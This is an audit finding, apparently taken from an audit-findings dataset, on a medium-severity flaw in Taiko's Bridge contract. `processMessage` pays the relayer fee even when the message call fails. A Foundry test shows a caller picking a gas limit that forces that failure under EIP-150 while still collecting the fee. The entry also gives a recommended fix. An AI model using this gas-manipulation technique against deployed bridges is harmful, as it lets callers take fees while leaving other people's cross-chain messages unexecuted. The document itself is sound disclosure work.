# [M] Malicious caller of `processMessage

## Summary
Severity: Medium
Contest weight: 0.5812
Dataset id: 21027
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The logic inside function `processMessage()` [provides a reward to the msg.sender](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L298) if they are not the `refundTo` address. However this reward or `_message.fee` is awarded even if the `_invokeMessageCall()` on [L282](https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/bridge/Bridge.sol#L282) fails and the message goes into a `RETRIABLE` state. In the retriable state, it has to be called by someone again and the current `msg.sender` has no obligation to be the one to call it.

This logic can be gamed by a malicious user using the **63/64th rule specified in** [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md).

    File: contracts/bridge/Bridge.sol

    ```solidity
    @--->                    uint256 gasLimit = msg.sender == _message.destOwner ? gasleft() : _message.gasLimit;

                    if (_invokeMessageCall(_message, msgHash, gasLimit)) {
                        _updateMessageStatus(msgHash, Status.DONE);
                    } else {
    @--->                _updateMessageStatus(msgHash, Status.RETRIABLE);
                    }
                }

                // Determine the refund recipient
                address refundTo =
                    _message.refundTo == address(0) ? _message.destOwner : _message.refundTo;

                // Refund the processing fee
                if (msg.sender == refundTo) {
                    refundTo.sendEther(_message.fee + refundAmount);
                } else {
                    // If sender is another address, reward it and refund the rest
    @--->            msg.sender.sendEther(_message.fee);
                    refundTo.sendEther(refundAmount);
                }
    ```

## Proof of Concept
Apply the following patch to add the test inside `protocol/test/bridge/Bridge.t.sol` and run via `forge test -vv --mt test_t0x1c_gasManipulation` to see it pass:

    diff --git a/packages/protocol/test/bridge/Bridge.t.sol b/packages/protocol/test/bridge/Bridge.t.sol
    index 6b7dca6..ce77ce2 100644
    --- a/packages/protocol/test/bridge/Bridge.t.sol
    +++ b/packages/protocol/test/bridge/Bridge.t.sol
    @@ -1,11 +1,19 @@
     // SPDX-License-Identifier: MIT
     pragma solidity 0.8.24;
     
     import "../TaikoTest.sol";
     
    +contract ToContract {
    +    receive() external payable {
    +        uint someVar;
    +        for(uint loop; loop < 86_990; ++loop)
    +            someVar += 1e18;
    +    }
    +}
    +
     // A contract which is not our ErcXXXTokenVault
     // Which in such case, the sent funds are still recoverable, but not via the
     // onMessageRecall() but Bridge will send it back
     contract UntrustedSendMessageRelayer {
         function sendMessage(
             address bridge,
    @@ -115,12 +123,71 @@ contract BridgeTest is TaikoTest {
             register(address(addressManager), "bridge", address(destChainBridge), destChainId);
     
             register(address(addressManager), "taiko", address(uint160(123)), destChainId);
             vm.stopPrank();
         }
     
    +    
    +    function test_t0x1c_gasManipulation() public {
    +        //**************** SETUP **********************
    +        ToContract toContract = new ToContract();
    +        IBridge.Message memory message = IBridge.Message({
    +            id: 0,
    +            from: address(bridge),
    +            srcChainId: uint64(block.chainid),
    +            destChainId: destChainId,
    +            srcOwner: Alice,
    +            destOwner: Alice,
    +            to: address(toContract),
    +            refundTo: Alice,
    +            value: 1000,
    +            fee: 1000,
    +            gasLimit: 11_000_000,
    +            data: "",
    +            memo: ""
    +        });
    +        // Mocking proof - but obviously it needs to be created in prod
    +        // corresponding to the message
    +        bytes memory proof = hex"00";
    +
    +        bytes32 msgHash = destChainBridge.hashMessage(message);
    +
    +        vm.chainId(destChainId);
    +        skip(13 hours);
    +        assertEq(destChainBridge.messageStatus(msgHash) == IBridge.Status.NEW, true);
    +        uint256 carolInitialBalance = Carol.balance;
    +
    +        uint256 snapshot = vm.snapshot();
    +        //**************** SETUP ENDS **********************
    +
    +
    +
    +        //**************** NORMAL USER **********************
    +        console.log("\n**************** Normal User ****************");
    +        vm.prank(Carol, Carol);
    +        destChainBridge.processMessage(message, proof);
    +
    +        assertEq(destChainBridge.messageStatus(msgHash) == IBridge.Status.DONE, true);
    +        assertEq(Carol.balance, carolInitialBalance + 1000, "Carol balance mismatch");
    +        if (destChainBridge.messageStatus(msgHash) == IBridge.Status.DONE)
    +            console.log("message status = DONE");
    +
    +
    +
    +        //**************** MALICIOUS USER **********************
    +        vm.revertTo(snapshot);
    +        console.log("\n**************** Malicious User ****************");
    +        vm.prank(Carol, Carol);
    +        destChainBridge.processMessage{gas: 10_897_060}(message, proof); // @audit-info : specify gas to force failure of excessively safe external call
    +
    +        assertEq(destChainBridge.messageStatus(msgHash) == IBridge.Status.RETRIABLE, true); // @audit : message now in RETRIABLE state. Carol receives the fee.
    +        assertEq(Carol.balance, carolInitialBalance + 1000, "Carol balance mismatched");
    +        if (destChainBridge.messageStatus(msgHash) == IBridge.Status.RETRIABLE)
    +            console.log("message status = RETRIABLE");
    +    }
    +
         function test_Bridge_send_ether_to_to_with_value() public {
             IBridge.Message memory message = IBridge.Message({
                 id: 0,
                 from: address(bridge),
                 srcChainId: uint64(block.chainid),
                 destChainId: destChainId,

## Recommendation
Reward the `msg.sender` (provided it’s a _non-refundTo_ address) with `_message.fee` only if `_invokeMessageCall()` returns `true`. Additionally, it is advisable to release this withheld reward after a successful `retryMessage()` to that function’s caller.

Fixed in <https://github.com/taikoxyz/taiko-mono/pull/16613>

I don’t think paying fees only when `_invokeMessageCall` returns true is a good idea as this will require the relayer to simulate all transactions without guaranteed reward.
